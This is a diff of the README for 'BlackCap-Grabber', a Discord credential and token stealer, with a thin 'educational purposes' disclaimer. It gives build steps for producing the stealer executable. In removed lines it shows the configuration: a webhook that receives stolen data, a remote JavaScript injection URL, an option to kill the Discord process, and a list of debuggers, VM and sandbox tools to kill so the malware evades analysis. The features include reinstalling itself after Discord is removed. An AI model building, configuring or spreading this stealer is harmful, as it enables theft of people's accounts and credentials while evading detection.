@@ -32,7 +32,6 @@ BlackCap was made for educational purposes, therefor all consequences caused by 
 - [🔰・Features](#features)
 - [🌌・Discord](https://discord.gg/blackcap)
 - [🎉・Setting up BlackCap](#setup)
-- [⚙・Config](#config)
 - [📝・Changelog](#changelog)
 
 
@@ -40,8 +39,8 @@ BlackCap was made for educational purposes, therefor all consequences caused by 
 
 1. Install [Python](https://www.python.org/downloads/)
 2. Install all requirements [install.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat)
-3. Edit the Configuration [index.py](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/index.py#L52)
-4. Double Click on [build.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/build.bat) to build
+3. Click on start.bat [build.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat)
+4. Complete the configuration
 5. You have your .exe file enjoy :)
 
 
@@ -86,63 +85,6 @@ BlackCap was made for educational purposes, therefor all consequences caused by 
 - Anti Delete system (re install after Discord uninstall / Discord Update)
 > + More!
 ```
-
-
-
-
-## <a id="config"></a>⚙ 〢 Config
-
-If you want to change the config (add your webhook), open up [index.py](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/index.py#L52) and locate it at the top. There you can configure the following:
-
-
-```py 
-{
-    
-__config__ = {
-    'yourwebhookurl': "place your webhook here",#your discord webhook url 
-    'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",#my javascript injection (i recommand to not change)
-    'hide': 'no',
-    'kill_discord_process': True,#you want to hide grabber? ('yes' or 'no')
-    'dbugkiller': True,#recommand to don't touch
-    'blprggg':#don't touch this
-    [
-        "httpdebuggerui", 
-        "wireshark", 
-        "fiddler", 
-        "regedit", 
-        "cmd", 
-        "taskmgr",
-        "vboxservice", 
-        "df5serv", 
-        "processhacker", 
-        "vboxtray", 
-        "vmtoolsd", 
-        "vmwaretray",
-        "ida64", 
-        "ollydbg", 
-        "pestudio", 
-        "vmwareuser", 
-        "vgauthservice", 
-        "vmacthlp",
-        "x96dbg", 
-        "vmsrvc", 
-        "x32dbg", 
-        "vmusrvc", 
-        "prl_cc", 
-        "prl_tools", 
-        "xenservice",
-        "qemu-ga", 
-        "joeboxcontrol", 
-        "ksdumperclient", 
-        "ksdumper", 
-        "joeboxserver"
-    ]
-
-}
-}
-```
-
----
 
 
 ## <a id="changelog"></a>💭 〢 ChangeLog
